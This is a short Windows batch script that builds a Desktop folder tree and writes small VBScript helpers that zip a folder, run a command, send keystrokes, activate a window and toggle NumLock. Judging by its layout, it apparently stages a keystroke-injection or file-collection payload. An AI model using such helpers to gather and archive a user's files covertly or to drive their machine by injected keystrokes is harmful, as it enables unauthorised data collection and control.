mkdir %USERPROFILE%\Desktop\PL & cd %USERPROFILE%\Desktop\PL & mkdir %USERPROFILE%\Desktop\PL\Exp & mkdir %USERPROFILE%\Desktop\PL\Scr & cd Scr
echo Set fs = CreateObject("Scripting.FileSystemObject"):Set sh = CreateObject("Shell.Application"): set ar = Wscript.Arguments 		>  Zip.vbs
echo Set zp = fs.CreateTextFile(ar(1)): Set sc = sh.NameSpace(ar(0)).Items: zp.Write Chr(80) ^& Chr(75) ^& Chr(5) ^& Chr(6) ^& String(18, 0) 	>> Zip.vbs
echo zp.Close: WScript.Sleep 1000: Set tg = sh.NameSpace(ar(1)): tg.CopyHere sc: WScript.Sleep 3000 				>> Zip.vbs
echo Set ws = CreateObject("WScript.Shell"): ws.SendKeys "{NUMLOCK}"							> Num.vbs
echo Set ws = CreateObject("WScript.Shell"): set ar = Wscript.Arguments: ws.Run ar(0)						> Run.vbs
echo Set ws = CreateObject("WScript.Shell"): set ar = Wscript.Arguments: ws.SendKeys ar(0)					> Snd.vbs
echo Set ws = CreateObject("WScript.Shell"): set ar = Wscript.Arguments: ws.appactivate ar(0)					> App.vbs